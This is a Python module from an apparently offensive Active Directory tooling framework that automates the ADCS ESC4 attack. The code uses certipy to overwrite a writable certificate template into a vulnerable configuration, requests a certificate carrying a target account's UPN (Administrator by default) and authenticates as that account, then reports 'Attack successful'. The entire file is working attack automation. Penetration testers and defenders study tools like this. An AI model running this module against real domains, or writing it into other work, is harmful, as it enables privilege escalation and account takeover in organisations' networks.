import os

from module import BaseModule
from tool import Tool

class ADCSESC4(BaseModule):
    name = "ADCS - ESC4"
    path = "adcs/esc4"
    description = "ESC4: Misconfigured Certificate Template - Writeable Configuration"
    info = """An attacker with write permissions (e.g., through ACLs) on a certificate template can directly modify its configuration to make it vulnerable (e.g., enabling SAN specification like ESC1) and then enroll in it.

Prerequisites:
  - The attacker has write permissions to a certificate template object in AD."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "User", "description": "ESC4 vulnerable template", "required": True},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        pfx = self.uniq_filename(self.opts.target_account)

        tool.title("Modify the template to a vulnerable state")
        if not await tool.certipy_template(['-template', self.opts.template, '-write-default-configuration']):
            return    

        tool.title("Request a certificate using the modified template")
        if not await tool.certipy_req(['-template', self.opts.template, '-upn', f"{self.opts.target_account}@{self.opts.domain}", '-out', pfx]):
            return

        tool.title("Authenticate as the target user with the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
